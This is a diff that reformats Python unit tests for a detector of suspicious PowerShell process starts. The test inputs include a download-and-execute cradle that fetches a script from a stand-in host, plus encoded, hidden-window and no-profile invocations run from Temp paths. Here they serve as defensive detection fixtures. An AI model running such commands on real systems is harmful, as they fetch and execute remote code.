@@ -1,8 +1,8 @@
 """Detector D003 - Suspicious PowerShell tests (Phase 2)."""
+
 from __future__ import annotations
 
 from backend.detection.engine import run_detection
-
 from tests.detection.helpers import event
 
 
@@ -11,8 +11,11 @@ def d003(event):
     return findings[0] if findings else None
 
 
-def ps(command_line: str, path: str = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-       name: str = "powershell.exe") -> event.__class__:
+def ps(
+    command_line: str,
+    path: str = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    name: str = "powershell.exe",
+) -> event.__class__:
     return event(
         action="process_start",
         event_type="process",
@@ -34,20 +37,33 @@ def test_encoded_command_detected():
 
 
 def test_download_script_detected():
-    detection = d003(ps("powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://x/1.ps1')"))
+    detection = d003(
+        ps(
+            "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://x/1.ps1')"
+        )
+    )
     assert detection is not None
     assert any(e.field == "script_download" for e in detection.evidence)
 
 
 def test_unusual_location_detected():
-    detection = d003(ps("powershell.exe -f x.ps1", path="C:\\Users\\alice\\AppData\\Local\\Temp\\x.ps1"))
+    detection = d003(
+        ps(
+            "powershell.exe -f x.ps1",
+            path="C:\\Users\\alice\\AppData\\Local\\Temp\\x.ps1",
+        )
+    )
     assert detection is not None
     assert any(e.field == "unusual_location" for e in detection.evidence)
 
 
 def test_two_characteristics_high_severity():
-    detection = d003(ps("powershell.exe -EncodedCommand SQBFAFgA -w hidden -nop",
-                        path="C:\\Users\\alice\\AppData\\Local\\Temp\\x.ps1"))
+    detection = d003(
+        ps(
+            "powershell.exe -EncodedCommand SQBFAFgA -w hidden -nop",
+            path="C:\\Users\\alice\\AppData\\Local\\Temp\\x.ps1",
+        )
+    )
     assert detection.severity == "high"
 
 
@@ -66,7 +82,11 @@ def test_non_powershell_process_not_detected():
     detection = event(
         action="process_start",
         event_type="process",
-        process={"name": "cmd.exe", "command_line": "cmd.exe /c dir", "path": "C:\\Windows\\System32\\cmd.exe"},
+        process={
+            "name": "cmd.exe",
+            "command_line": "cmd.exe /c dir",
+            "path": "C:\\Windows\\System32\\cmd.exe",
+        },
         facts={},
     )
     assert d003(detection) is None
@@ -77,13 +97,18 @@ def test_non_powershell_process_not_detected():
 
 def test_confidence_grows_with_characteristics():
     one = d003(ps("powershell.exe -EncodedCommand SQBFAFgA"))
-    two = d003(ps("powershell.exe -EncodedCommand SQBFAFgA -w hidden", path="C:\\Temp\\x.ps1"))
+    two = d003(
+        ps("powershell.exe -EncodedCommand SQBFAFgA -w hidden", path="C:\\Temp\\x.ps1")
+    )
     assert two.confidence > one.confidence
     assert 0.0 <= two.confidence <= 1.0
 
 
 def test_case_insensitive_powershell():
-    assert d003(ps("powershell.exe -nop", path="C:\\Temp\\x.ps1", name="PowerShell.EXE")) is not None
+    assert (
+        d003(ps("powershell.exe -nop", path="C:\\Temp\\x.ps1", name="PowerShell.EXE"))
+        is not None
+    )
 
 
 def test_pwsh_supported():
@@ -97,7 +122,10 @@ def test_missing_command_line_no_detection():
     detection = event(
         action="process_start",
         event_type="process",
-        process={"name": "powershell.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
+        process={
+            "name": "powershell.exe",
+            "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        },
         facts={},
     )
     assert d003(detection) is None
